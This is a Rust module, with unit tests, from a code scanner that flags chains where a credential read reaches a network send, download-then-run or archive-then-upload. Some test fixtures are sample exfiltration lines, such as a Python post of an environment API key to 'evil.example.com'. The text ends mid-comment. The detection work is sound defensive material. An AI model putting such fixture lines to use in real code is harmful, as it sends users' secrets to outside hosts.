//! Finding correlation: the one-hop data-flow check a line regex cannot make.
//!
//! prism-scanner's strongest single detection is its S8 rule: a value read
//! from a credential source (an API key taken from the environment, the
//! contents of an SSH private key) that flows into the payload of a network
//! send. It gets there with a
//! Python-only AST taint tracker. ADR-0005 rules out taint analysis in the
//! declarative corpus — and keeps the engine free of user code — so Sigil
//! makes the same call a different way: over the findings the content phases
//! already produced, in any language.
//!
//! A [`CorrelationRule`] names a *source* selector and a *sink* selector.
//! For every source finding and sink finding in the same file, at most
//! `window_lines` apart with the source first (or on the same line), the
//! link is established when
//!
//! 1. the source line *binds* a name and that name appears as a whole word
//!    in the sink's argument window (the sink line and the few lines after
//!    it, where a multi-line call keeps its arguments), or
//! 2. source and sink are the same line (`requests.post(u, json={"k":
//!    os.getenv("KEY")})`);
//!
//! and no `sink_excludes` substring appears in that window — `headers=` and
//! `Authorization` are where a key legitimately goes, and excluding them is
//! what keeps every ordinary API client from lighting up.
//!
//! A rule may also set `sink_window_before`, which makes the window the
//! sink's *statement* (see [`statement_scope`]). That is for sinks matched on
//! a keyword argument that a formatter puts on its own line at the end of a
//! call (`verify=False,` under `requests.post(`), where the arguments that
//! carry the value are above the sink, not below it. The statement is the
//! lines that *continue into* the sink line — the call's opening line and
//! its earlier arguments, each ending with `(`, `[`, `,`, `\` or an object
//! literal's `{` (see [`continuation_start`]) — the sink line, and the lines
//! its call continues onto. The window adds the nearby lines that set up or
//! use the object the statement works with (a `headers` dict above it, the
//! `agent` it builds used below it). A complete statement about something
//! else (`client = OpenAI(api_key=key)` on the line above) is not read, so a
//! credential used there does not link to an unrelated insecure call. A
//! source finding on a line of the statement is inside the same call, and
//! links without needing a name: `headers={"Authorization":
//! os.environ["TOKEN"]},` above or below `verify=False,`.
//!
//! A rule may set `max_line_length`: a source or sink on a longer line is not
//! linked, because on a minified bundle one line holds a whole program.
//!
//! A line binds a name by assigning to it (`key = os.getenv(...)`), by the
//! `as` name of a `with` item that *yields* data (`with open(KEY_PATH) as
//! keyfile`, `with urlopen(req) as response` — see [`with_handles`]), or by
//! naming the file it writes (see [`written_paths`]): `open(PATH, 'wb')`,
//! `urlretrieve(url, PATH)`, and the output operand of a download or archive
//! command (`curl -o "$OUT"`, `curl.exe ... -o "{out}"`, `wget -O`,
//! `Invoke-WebRequest -OutFile`, `tar -czf "$TARBALL"`) — a variable, or a
//! literal path such as `"/tmp/managed.pyz"` that the sink repeats. The file
//! binding is what connects a download to the later line that runs the
//! downloaded file, and a project archive to the later line that uploads it:
//! in both, what travels between the two lines is a path, not an assigned
//! expression.
//!
//! Two bindings are deliberately *not* made, because the data flows the
//! other way:
//!
//! - the handle of a file opened for writing (`with open(p, 'w') as out`)
//!   receives data. A login helper that opens `~/.netrc` for writing and then
//!   posts to the auth endpoint writes the *response* into the handle; binding
//!   the handle would report that as the credential file reaching the send.
//! - a sink that *runs a file* (behaviour `executes_program`: an interpreter
//!   on a path, `Start-Process`, `os.startfile`) is linked only through a file
//!   the source line wrote, named on the launch line itself. What an HTTP call
//!   assigns (`data = client.get(u).json()`) and then hands to a local script
//!   as input is an argument to that script, not the program that runs.
//!
//! Correlation reads rule ids, never severities: a Low observation (an HTTP
//! client call, a subprocess launch, an environment read) is as good a source
//! or sink as a High finding, and the chain carries its own severity.
//!
//! The result is a new finding at the sink line whose snippet names both
//! ends of the chain, so the report explains itself: `Credential read
//! (CRED-012 @L9) reaches network send (NET-001 @L10)`.

use std::sync::OnceLock;

use regex::Regex;

use crate::corpus::schema::CorrelationRule;

use super::{Finding, Phase, Severity};

/// Lines after the sink line that still count as the sink's arguments.
const SINK_ARG_WINDOW: usize = 5;

fn assignment_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        // `name = ...`, `const name = ...`, `let name: T = ...`, `self.name = ...`,
        // `name := ...`. The identifier captured is the last dotted segment.
        Regex::new(
            r"^\s*(?:(?:const|let|var|export|local|my|our|\$)\s+)?(?:[A-Za-z_][A-Za-z0-9_]*\.)*([A-Za-z_][A-Za-z0-9_]*)\s*(?::\s*[A-Za-z0-9_\[\]<>|, ]+)?\s*(?::=|=)[^=]",
        )
        .expect("assignment regex compiles")
    })
}

/// The identifier a source line assigns to, if it is an assignment.
pub fn assigned_identifier(line: &str) -> Option<&str> {
    assignment_re()
        .captures(line)
        .and_then(|c| c.get(1))
        .map(|m| m.as_str())
}

/// A file opened for writing: `open(PATH, 'wb')`, `open(self.path, "a")`,
/// `open(path, mode="w")`. Captures the last segment of the path expression
/// when it is a (possibly dotted) identifier; a literal path is not a name
/// the sink could repeat as an identifier.
fn open_for_write_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r#"\bopen\s*\(\s*(?:[A-Za-z_][A-Za-z0-9_]*\.)*([A-Za-z_][A-Za-z0-9_]*)\s*,\s*(?:mode\s*=\s*)?[rbtuf]*["'][rbt]*[wax][bt+]*["']"#,
        )
        .expect("open-for-write regex compiles")
    })
}

/// `with a as x, b as y:` — the names a `with` statement binds.
fn with_as_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"\bas\s+([A-Za-z_][A-Za-z0-9_]*)\s*[,:)]").expect("with-as regex compiles")
    })
}

/// `urlretrieve(url, PATH)` / `urllib.request.urlretrieve(url, filename=PATH)`.
fn urlretrieve_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"\burlretrieve\s*\([^,\n]+,\s*(?:filename\s*=\s*)?(?:[A-Za-z_][A-Za-z0-9_]*\.)*([A-Za-z_][A-Za-z0-9_]*)\s*[,)]",
        )
        .expect("urlretrieve regex compiles")
    })
}

/// The output operand of a download or archive command, in shell, in
/// PowerShell, or inside a Python/JS string that builds one:
/// `curl -o "$OUT"`, `curl.exe -L <url> -o "{output_file}"`,
/// `wget -O "${dest}"`, `Invoke-WebRequest <url> -OutFile $path`,
/// `tar -czf "$TARBALL" ...`. Only variable references are captured here
/// (`$X`, `${X}`, `{X}`; `$env:X` is left alone); literal paths are
/// [`literal_target_re`]'s, which takes only paths that cannot be mistaken
/// for an ordinary word.
fn output_operand_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r#"(?:\s(?:-o|-O|--output|--output-document|-OutFile|--file)|\btar\s+-?[A-Za-z]*c[A-Za-z]*f)(?:\s+|=)["']?(?:\$\{|\$|\{)([A-Za-z_][A-Za-z0-9_]*)"#,
        )
        .expect("output-operand regex compiles")
    })
}

/// A literal file path a line writes: `open("/tmp/x.pyz", "wb")`,
/// `urlretrieve(url, "/tmp/managed.pyz")`, `curl -o /tmp/install.sh`,
/// `wget -O ./payload.exe`. Only a path with a directory separator, or a file
/// name with an executable or archive extension, is captured — a bare word is
/// too common to link on.
fn literal_target_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r#"(?:\burlretrieve\s*\([^,\n]+,\s*(?:filename\s*=\s*)?["']|(?:\s(?:-o|-O|--output|--output-document|-OutFile)|\btar\s+-?[A-Za-z]*c[A-Za-z]*f)(?:\s+|=)["']?)((?:~|\.{1,2})?/[^\s"';|&)]+|[A-Za-z0-9_.-]+\.(?:sh|py|pyz|pyc|js|exe|ps1|bat|cmd|msi|jar|bin|run|AppImage|dll|so|dylib|tgz|zip))(?:["']?\s*[,)]|["']?\s|["']?$)"#,
        )
        .expect("literal-target regex compiles")
    })
}

/// `open("/tmp/x.pyz", "wb")`: a literal path opened for writing.
fn literal_open_for_write_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r#"\bopen\s*\(\s*["']((?:~|\.{1,2})?/[^"'\n]+|[A-Za-z0-9_.-]+\.(?:sh|py|pyz|pyc|js|exe|ps1|bat|cmd|msi|jar|bin|run|AppImage|dll|so|dylib))["']\s*,\s*(?:mode\s*=\s*)?[rbtuf]*["'][rbt]*[wax][bt+]*["']"#,
        )
        .expect("literal-open regex compiles")
    })
}

/// Any `open(...)` whose mode writes: `'w'`, `"ab"`, `mode="x"`, `'wb+'`.
/// Used to tell a `with` item that receives data from one that yields it;
/// the path expression may be any call (`open(os.path.expanduser(p), 'w')`).
fn write_mode_open_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r#"\bopen\s*\([^\n]*?,\s*(?:mode\s*=\s*)?["'][rbt]*[wax][rbt+]*["']"#)
            .expect("write-mode open regex compiles")
    })
}

/// Push `s` unless it is a one-character name or already present.
///
/// One-character names (`with open(p, "wb") as f`) are dropped: `f`, `r` and
/// `b` are also string prefixes, so `f"..."` in the sink window would read as
/// a use of the file handle.
fn push_binding<'a>(out: &mut Vec<&'a str>, s: &'a str) {
    if s.len() > 1 && !out.contains(&s) {
        out.push(s);
    }
}

/// The files a line writes, named the way a later line would name them
/// again: `open(PATH, 'wb')`, `urlretrieve(url, PATH)`, the output operand of
/// `curl -o` / `wget -O` / `-OutFile` / `tar -c…f`, or a literal path with a
/// directory or an executable extension. See the module documentation.
pub fn written_paths(line: &str) -> Vec<&str> {
    let res: [&Regex; 5] = [
        open_for_write_re(),
        urlretrieve_re(),
        output_operand_re(),
        literal_target_re(),
        literal_open_for_write_re(),
    ];
    let mut out: Vec<&str> = Vec::new();
    for re in res {
        for c in re.captures_iter(line) {
            if let Some(m) = c.get(1) {
                // A device is not a file anyone runs or uploads afterwards:
                // `curl -o /dev/null <health-check>` writes nothing, and
                // `/dev/null` recurs on unrelated lines (`>/dev/null`).
                if m.as_str().starts_with("/dev/") {
                    continue;
                }
                push_binding(&mut out, m.as_str());
            }
        }
    }
    out
}

/// The `as` names of a `with` statement whose item *yields* data: a file
/// opened for reading, a response, any other context manager. The handle of
/// a file opened for writing receives data, so it is not bound — see the
/// module documentation.
pub fn with_handles(line: &str) -> Vec<&str> {
    let trimmed = line.trim_start();
    if !(trimmed.starts_with("with ") || trimmed.starts_with("async with ")) {
        return Vec::new();
    }
    let mut out: Vec<&str> = Vec::new();
    let mut item_start = 0;
    for c in with_as_re().captures_iter(line) {
        let (Some(whole), Some(name)) = (c.get(0), c.get(1)) else {
            continue;
        };
        let item = &line[item_start..whole.start()];
        item_start = whole.end();
        if write_mode_open_re().is_match(item) {
            continue;
        }
        push_binding(&mut out, name.as_str());
    }
    out
}

/// The files a line writes and the data handles it opens: everything a line
/// binds besides an assignment.
pub fn written_targets(line: &str) -> Vec<&str> {
    let mut out = written_paths(line);
    for h in with_handles(line) {
        push_binding(&mut out, h);
    }
    out
}

/// Every name a source line binds: its assignment target, then the files it
/// writes and the data handles it opens.
fn source_bindings(line: &str) -> Vec<&str> {
    let mut out: Vec<&str> = Vec::new();
    if let Some(ident) = assigned_identifier(line) {
        out.push(ident);
    }
    for t in written_targets(line) {
        if !out.contains(&t) {
            out.push(t);
        }
    }
    out
}

/// Whether a sink *runs a file*: then only a file the source line wrote can
/// link to it (see the module documentation).
fn runs_a_file(rule_id: &str) -> bool {
    super::profile::behavior_for(rule_id) == Some("executes_program")
}

/// Does `ident` appear as a whole word in `text`?
fn contains_word(text: &str, ident: &str) -> bool {
    let bytes = text.as_bytes();
    let mut start = 0;
    while let Some(pos) = text[start..].find(ident) {
        let at = start + pos;
        let end = at + ident.len();
        let before_ok = at == 0 || !is_ident_byte(bytes[at - 1]);
        let after_ok = end >= bytes.len() || !is_ident_byte(bytes[end]);
        if before_ok && after_ok {
            return true;
        }
        start = at + 1;
    }
    false
}

fn is_ident_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

/// Run every correlation rule over one file's findings.
///
/// `lines` are the file's lines (already normalised for matching), used to
/// read the source assignment and the sink argument window. Returns only the
/// new chain findings; the caller appends them.
pub fn apply(rules: &[CorrelationRule], findings: &[Finding], lines: &[&str]) -> Vec<Finding> {
    let mut out: Vec<Finding> = Vec::new();
    if rules.is_empty() || findings.len() < 2 {
        return out;
    }

    for rule in rules {
        let Some(phase) = Phase::from_name(&rule.phase) else {
            continue;
        };
        let severity = parse_severity(&rule.severity);
        let weight = rule.weight.unwrap_or_else(|| phase.default_weight());

        let sources: Vec<&Finding> = findings
            .iter()
            .filter(|f| f.line.is_some() && rule.source.accepts(&f.rule))
            .collect();
        if sources.is_empty() {
            continue;
        }
        let sinks: Vec<&Finding> = findings
            .iter()
            .filter(|f| f.line.is_some() && rule.sink.accepts(&f.rule))
            .collect();

        let mut emitted: Vec<(usize, usize)> = Vec::new();
        for sink in &sinks {
            let sink_line = sink.line.unwrap_or(0);
            if too_long(lines, sink_line, rule.max_line_length) {
                continue;
            }
            let file_only = runs_a_file(&sink.rule);
            // A rule that looks above the sink reads the sink's statement and
            // the lines that set up or use the object it binds; every other
            // rule reads the sink line and the lines after it.
            let scope = if file_only || rule.sink_window_before == 0 {
                SinkScope {
                    start: sink_line,
                    end: sink_line,
                    text: arg_window(lines, sink_line),
                }
            } else {
                statement_scope(lines, sink_line, rule.sink_window_before)
            };
            let window = scope.text;
            // A launch names its program on its own line (the launch rule
            // matches interpreter and operand together), so the lines after
            // it are not its program: `>/dev/null` or `input=data` there is
            // not what runs.
            let link_text: &str = if file_only {
                lines.get(sink_line.wrapping_sub(1)).copied().unwrap_or("")
            } else {
                &window
            };
            if rule
                .sink_excludes
                .iter()
                .any(|x| window.contains(x.as_str()))
            {
                continue;
            }
            for source in &sources {
                let source_line = source.line.unwrap_or(0);
                // A source on another line of the sink's own statement (the
                // call or literal it is an argument of, above or below it)
                // is in that call: what it reads is one of the arguments,
                // whatever name it is, or is not, bound to.
                let in_same_call =
                    source_line != sink_line && (scope.start..=scope.end).contains(&source_line);
                if !in_same_call
                    && (source_line > sink_line || sink_line - source_line > rule.window_lines)
                {
                    continue;
                }
                if too_long(lines, source_line, rule.max_line_length) {
                    continue;
                }
                // Any other source is linked through a name it binds that
                // the window uses.
                let linked = if source_line == sink_line || in_same_call {
                    true
                } else {
                    lines.get(source_line.wrapping_sub(1)).is_some_and(|l| {
                        let bound = if file_only {
                            written_paths(l)
                        } else {
                            source_bindings(l)
                        };
                        bound.iter().any(|ident| contains_word(link_text, ident))
                    })
                };
                if !linked {
                    continue;
                }
                let key = (source_line, sink_line);
                if emitted.contains(&key) {
                    continue;
                }
                emitted.push(key);
                out.push(Finding {
                    phase,
                    rule: rule.id.clone(),
                    severity,
                    file: sink.file.clone(),
                    line: Some(sink_line),
                    snippet: format!(
                        "{}: {} (@L{}) reaches {} (@L{}): {}",
                        rule.description,
                        source.rule,
                        source_line,
                        sink.rule,
                        sink_line,
                        truncate(
                            lines
                                .get(sink_line.wrapping_sub(1))
                                .map_or("", |l| l.trim())
                        )
                    ),
                    weight,
                    kev: false,
                    epss: 0.0,
                    fingerprint: String::new(),
                    locator: sink.locator.clone(),
                    evidence: Default::default(),
                });
            }
        }
    }
    out
}

/// The sink line plus the lines that can still carry its arguments: the
/// [`SINK_ARG_WINDOW`] lines from the sink (1-based) down.
fn arg_window(lines: &[&str], sink_line: usize) -> String {
    if sink_line == 0 {
        return String::new();
    }
    let start = sink_line - 1;
    let end = lines.len().min(start + SINK_ARG_WINDOW);
    lines
        .get(start..end)
        .map(|w| w.join("\n"))
        .unwrap_or_default()
}

/// The sink's statement (1-based lines `start..=end`) and the text a link is
/// read from.
struct SinkScope {
    start: usize,
    end: usize,
    text: String,
}

/// The window of a rule with `sink_window_before`: the statement the sink
/// line belongs to, and the nearby lines that set up or use the object that
/// statement works with.
///
/// - **The statement**: the lines above that continue into the sink line
///   (at most `before`, see [`continuation_start`]), the sink line, and the
///   lines below it that its call continues onto (within
///   [`SINK_ARG_WINDOW`]).
/// - **Set-up above** (within `before` lines of the sink): a line that
///   assigns to or calls a method on a local name the statement uses —
///   `headers = {"Authorization": ...}` above `get(url, headers=headers,
///   verify=False)`, `session.headers.update(...)` above
///   `session.get(url, verify=False)`. "Local" means assigned on one of
///   those lines, or an attribute of `self` / `this`, so an imported module
///   (`requests.post(...)` above `requests.get(..., verify=False)`) does not
///   connect two unrelated calls.
/// - **Use below** (within [`SINK_ARG_WINDOW`] lines of the sink): a line
///   that uses the name the statement assigns — `fetch(url, { agent, ... })`
///   after `const agent = new https.Agent({ rejectUnauthorized: false })`.
///
/// Any other line near the sink is a different statement about something
/// else, and is not read: a key used by `client = OpenAI(api_key=key)` on the
/// line above an unrelated insecure request is not sent by that request.
fn statement_scope(lines: &[&str], sink_line: usize, before: usize) -> SinkScope {
    if sink_line == 0 || sink_line > lines.len() {
        return SinkScope {
            start: sink_line,
            end: sink_line,
            text: String::new(),
        };
    }
    let line = |n: usize| lines[n - 1];
    let start = continuation_start(lines, sink_line, before);
    let last = lines.len().min(sink_line + SINK_ARG_WINDOW - 1);
    let mut end = sink_line;
    while end < last && continues_into_next(line(end)) {
        end += 1;
    }
    let statement = (start..=end).map(line).collect::<Vec<_>>().join("\n");

    let top = sink_line.saturating_sub(before).max(1);
    let locals: Vec<&str> = (top..=end)
        .filter_map(|n| assigned_name(line(n)).map(|(name, _)| name))
        .collect();
    let mut keep: Vec<usize> = (top..start)
        .filter(|&n| {
            leading_name(line(n)).is_some_and(|(name, attr)| {
                (attr || locals.contains(&name)) && contains_word(&statement, name)
            })
        })
        .collect();
    keep.extend(start..=end);
    if let Some((bound, _)) = assigned_name(line(start)) {
        keep.extend((end + 1..=last).filter(|&n| contains_word(line(n), bound)));
    }
    SinkScope {
        start,
        end,
        text: keep.into_iter().map(line).collect::<Vec<_>>().join("\n"),
    }
}

/// Declaration keywords before the name a line starts with, and an optional
/// `self.` / `this.` / `@` / `$`.
const NAME_HEAD: &str = r"^\s*(?:(?:const|let|mut|var|export|local|my|our|final|val|auto|readonly)\s+)*[$@]?((?:self|this)\.)?([A-Za-z_][A-Za-z0-9_]*)";

fn leading_name_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(NAME_HEAD).expect("leading-name regex compiles"))
}

fn assigned_name_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        // The name, then attribute or subscript steps (`session.verify`,
        // `session.headers["Authorization"]`), an optional type annotation,
        // and an assignment operator that is not a comparison.
        Regex::new(&format!(
            r"{NAME_HEAD}(?:\s*\.\s*[A-Za-z_][A-Za-z0-9_]*|\[[^\]\n]*\])*\s*(?::\s*[A-Za-z0-9_\[\]<>|,. ]+)?\s*(?::=|\+=|=)(?:[^=]|$)"
        ))
        .expect("assigned-name regex compiles")
    })
}

/// The first name on a line (after declaration keywords), and whether it is
/// an attribute of `self` / `this`.
fn leading_name(line: &str) -> Option<(&str, bool)> {
    let c = leading_name_re().captures(line)?;
    Some((c.get(2)?.as_str(), c.get(1).is_some()))
}

/// The object a line assigns to: `agent` in `const agent = ...`, `session`
/// in `session.verify = False` and `self.session.headers["A"] = ...`.
fn assigned_name(line: &str) -> Option<(&str, bool)> {
    let c = assigned_name_re().captures(line)?;
    Some((c.get(2)?.as_str(), c.get(1).is_some()))
}

/// The first line (1-based) of the run of lines directly above `sink_line`
/// that continue into it, at most `before` lines up; `sink_line` itself when
/// the line above does not continue, or `before` is 0.
///
/// A line continues into the next when it ends inside an open argument
/// list or literal: with `(`, `[`, `,`, a backslash, or a `{` that opens an
/// object or struct literal rather than a block (see [`continues_into_next`]).
/// So the run is the opening line and the earlier arguments of the
/// multi-line call whose last argument is the sink, and it stops at the
/// first complete statement above it.
fn continuation_start(lines: &[&str], sink_line: usize, before: usize) -> usize {
    let mut start = sink_line;
    while start > 1 && sink_line - (start - 1) <= before {
        match lines.get(start - 2) {
            Some(above) if continues_into_next(above) => start -= 1,
            _ => break,
        }
    }
    start
}

/// Does this line end inside an argument list or literal that the next line
/// continues? Trailing `#` and `//` comments are ignored.
fn continues_into_next(line: &str) -> bool {
    let code = strip_trailing_comment(line).trim_end();
    let Some(last) = code.chars().last() else {
        return false;
    };
    match last {
        '(' | '[' | ',' | '\\' => true,
        '{' => {
            let head = &code[..code.len() - 1];
            let before = head.trim_end();
            let spaced = before.len() < head.len();
            match before.chars().last() {
                // A `{` alone on its line (an Allman-style initializer or
                // block) carries nothing a name could be read from.
                None => true,
                // An object literal: `= {`, `({`, `[{`, `, {`, `key: {`,
                // `? {`, `{ {`.
                Some('=' | '(' | '[' | ',' | ':' | '?' | '{' | '|' | '&') => true,
                // A block: `f(token) {`, `() => {`.
                Some(')' | '>') => false,
                // `return {` returns an object literal.
                Some(_) if before.ends_with("return") => true,
                // `tls.Config{` / `Transport{` (a struct literal glued to its
                // type) against `class A {`, `else {`, `func f() *T {`.
                Some(_) => !spaced,
            }
        }
        _ => false,
    }
}

/// The line up to a trailing comment: a `#` or `//` that follows whitespace
/// (so `://` in a URL and `this.#field` are kept).
fn strip_trailing_comment(line: &str) -> &str {
    let bytes = line.as_bytes();
    for (i, w) in bytes.windows(2).enumerate() {
        if w[0].is_ascii_whitespace() && (w[1] == b'#' || line[i + 1..].starts_with("//")) {
            return &line[..i];
        }
    }
    line
}

/// Is 1-based line `n` longer than `limit` bytes (`limit` 0: never)?
fn too_long(lines: &[&str], n: usize, limit: usize) -> bool {
    limit > 0
        && lines
            .get(n.wrapping_sub(1))
            .is_some_and(|l| l.len() > limit)
}

fn truncate(s: &str) -> String {
    const LIMIT: usize = 120;
    if s.len() <= LIMIT {
        return s.to_string();
    }
    let end = s
        .char_indices()
        .take_while(|(i, _)| *i < LIMIT)
        .last()
        .map(|(i, ch)| i + ch.len_utf8())
        .unwrap_or(0);
    format!("{} ...", &s[..end])
}

fn parse_severity(s: &str) -> Severity {
    match s.to_lowercase().as_str() {
        "critical" => Severity::Critical,
        "high" => Severity::High,
        "medium" => Severity::Medium,
        _ => Severity::Low,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::corpus::schema::FindingSelector;

    fn rule() -> CorrelationRule {
        CorrelationRule {
            id: "EXFIL-CHAIN-001".to_string(),
            phase: "network_exfil".to_string(),
            severity: "critical".to_string(),
            description: "Credential read reaches a network send".to_string(),
            weight: Some(10),
            source: FindingSelector {
                rule_prefixes: vec!["CRED-".to_string()],
                rule_ids: vec![],
            },
            sink: FindingSelector {
                rule_prefixes: vec![],
                rule_ids: vec!["NET-001".to_string(), "NET-004".to_string()],
            },
            window_lines: 20,
            sink_window_before: 0,
            max_line_length: 0,
            sink_excludes: vec!["headers".to_string(), "Authorization".to_string()],
            remediation: None,
            references: vec![],
            tags: vec![],
        }
    }

    fn f(rule: &str, line: usize) -> Finding {
        Finding {
            phase: Phase::Credentials,
            rule: rule.to_string(),
            severity: Severity::Low,
            file: "a.py".to_string(),
            line: Some(line),
            snippet: String::new(),
            weight: 1,
            kev: false,
            epss: 0.0,
            fingerprint: String::new(),
            locator: None,
            evidence: Default::default(),
        }
    }

    #[test]
    fn assignment_identifiers() {
        // sigil:ignore-next-line CRED-001 -- test input string, not a read
        assert_eq!(
            assigned_identifier("api_key = os.getenv(\"OPENAI_API_KEY\")"),
            Some("api_key")
        );
        assert_eq!(
            assigned_identifier("const token = process.env.TOKEN;"),
            Some("token")
        );
        assert_eq!(
            assigned_identifier("let key: string = process.env.KEY!"),
            Some("key")
        );
        assert_eq!(
            assigned_identifier("self.secret = os.environ['SECRET']"),
            Some("secret")
        );
        assert_eq!(assigned_identifier("if a == b:"), None);
        assert_eq!(assigned_identifier("requests.post(url, json=data)"), None);
    }

    /// prism's fixture, lines 9-10: the key read on one line is the payload of
    /// the post on the next.
    #[test]
    fn links_assignment_to_payload() {
        let src = "import os\napi_key = os.getenv(\"OPENAI_API_KEY\")\nrequests.post(\"https://evil.example.com/c\", json={\"key\": api_key})\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 2), f("NET-001", 3)];
        let chains = apply(&[rule()], &findings, &lines);
        assert_eq!(chains.len(), 1, "{chains:#?}");
        assert_eq!(chains[0].rule, "EXFIL-CHAIN-001");
        assert_eq!(chains[0].line, Some(3));
        assert_eq!(chains[0].severity, Severity::Critical);
        assert_eq!(chains[0].weight, 10);
        assert!(chains[0]
            .snippet
            .contains("CRED-012 (@L2) reaches NET-001 (@L3)"));
    }

    /// The ordinary API client: key read, then used in an auth header. No chain.
    #[test]
    fn auth_header_use_is_not_exfiltration() {
        let src = "token = os.environ[\"API_TOKEN\"]\nresp = requests.get(url, headers={\"Authorization\": f\"Bearer {token}\"})\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 2)];
        assert!(apply(&[rule()], &findings, &lines).is_empty());
    }

    /// Proximity alone is not a link: an unrelated request near a key read.
    #[test]
    fn unrelated_nearby_request_is_not_a_chain() {
        let src =
            "key = os.environ[\"SECRET_KEY\"]\nrequests.get(\"https://example.com/status\")\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 2)];
        assert!(apply(&[rule()], &findings, &lines).is_empty());
    }

    #[test]
    fn multiline_call_arguments_are_in_the_window() {
        let src = "secret = os.getenv(\"AWS_SECRET_ACCESS_KEY\")\nrequests.post(\n    url,\n    data={\"s\": secret},\n)\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 2)];
        assert_eq!(apply(&[rule()], &findings, &lines).len(), 1);
    }

    #[test]
    fn same_line_source_and_sink_link() {
        let src = "requests.post(url, json={\"k\": os.getenv(\"API_KEY\")})\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 1)];
        assert_eq!(apply(&[rule()], &findings, &lines).len(), 1);
    }

    #[test]
    fn window_and_order_are_enforced() {
        let mut src = String::from("key = os.getenv(\"API_KEY\")\n");
        for _ in 0..25 {
            src.push_str("pass\n");
        }
        src.push_str("requests.post(url, json={\"k\": key})\n");
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 27)];
        assert!(
            apply(&[rule()], &findings, &lines).is_empty(),
            "outside window"
        );

        let src2 = "requests.post(url, json={\"k\": key})\nkey = os.getenv(\"API_KEY\")\n";
        let lines2: Vec<&str> = src2.lines().collect();
        let findings2 = vec![f("NET-001", 1), f("CRED-012", 2)];
        assert!(
            apply(&[rule()], &findings2, &lines2).is_empty(),
            "sink before source"
        );
    }

    /// The write-target binder: each form names the file the line writes.
    /// (The end-to-end download→run and archive→upload chains are tested in
    /// `corpus::engine::reconcile`, which is excluded from the self-scan; the
    /// strings here are chosen so no content rule fires on this file.)
    #[test]
    fn written_targets_name_the_file_a_line_writes() {
        // The written path and the handle that yields data are bound; the
        // handle of the file opened for writing receives data and is not.
        assert_eq!(
            written_targets("    with src as response, open(PATH, 'wb') as out_file:"),
            vec!["PATH", "response"]
        );
        assert_eq!(
            written_paths("    with src as response, open(PATH, 'wb') as out_file:"),
            vec!["PATH"]
        );
        assert_eq!(
            written_targets("fh = open(self.dest, mode=\"ab\")"),
            vec!["dest"]
        );
        assert_eq!(
            written_targets("urlretrieve(url, filename=target_path)"),
            vec!["target_path"]
        );
        assert_eq!(
            written_targets(r#"cmd = f'fetch.exe -L {url} -o "{output_file}"'"#),
            vec!["output_file"]
        );
        assert_eq!(
            written_targets(r#"    tar -czf "$TARBALL" -C "$PROJECT_PATH" ."#),
            vec!["TARBALL"]
        );
        assert_eq!(
            written_targets("fetch-tool -OutFile $installer"),
            vec!["installer"]
        );
        // A read binds its handle (the data it yields), never its path; a
        // bare word after `-o` is not a path anyone can be sure of.
        assert_eq!(
            written_targets("with open(path) as handle:"),
            vec!["handle"]
        );
        assert!(written_paths("with open(path) as handle:").is_empty());
        assert!(written_targets("with open(os.path.expanduser(p), 'w') as out:").is_empty());
        assert!(!written_targets("data = open(path, 'rb').read()").contains(&"path"));
        assert!(written_targets("fetch-tool -o out").is_empty());
        // A literal path with a directory, or an executable file name, is
        // bound as written: `-o /tmp/x`, `urlretrieve(url, "/tmp/x.pyz")`.
        assert_eq!(
            written_targets("fetch-tool -o /tmp/out.bin"),
            vec!["/tmp/out.bin"]
        );
        assert_eq!(
            written_targets(r#"retrieve_it = open("/tmp/stage.pyz", "wb")"#),
            vec!["/tmp/stage.pyz"]
        );
        // The assignment is bound too, by `source_bindings`.
        assert_eq!(
            source_bindings(r#"retrieve_it = open("/tmp/stage.pyz", "wb")"#),
            vec!["retrieve_it", "/tmp/stage.pyz"]
        );
        assert!(written_targets(r#"text = open("/etc/hosts").read()"#).is_empty());
        // Output discarded to a device writes no file a later line can use.
        assert!(written_paths("fetch-tool -fsS -o /dev/null \"$CHECK_URL\"").is_empty());
        // One-letter handles collide with string prefixes (f"...", r"...").
        assert!(written_targets("with open(dest, 'w') as f:") == vec!["dest"]);
    }

    /// A path written on one line and used on the next links through the
    /// write binding, not only through an assignment.
    #[test]
    fn write_binding_links_like_an_assignment() {
        let src = "with src as response, open(PATH, 'wb') as out_file:\n    out_file.write(response.read())\nrun([\"tool\", PATH])\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 3)];
        assert_eq!(apply(&[rule()], &findings, &lines).len(), 1);
        // The same shape with a different path does not link.
        let src2 = "with src as response, open(PATH, 'wb') as out_file:\n    out_file.write(response.read())\nrun([\"tool\", OTHER])\n";
        let lines2: Vec<&str> = src2.lines().collect();
        assert!(apply(&[rule()], &findings, &lines2).is_empty());
    }

    /// A file opened for writing receives data. A login helper that opens a
    /// credential file for writing and then calls the auth endpoint writes the
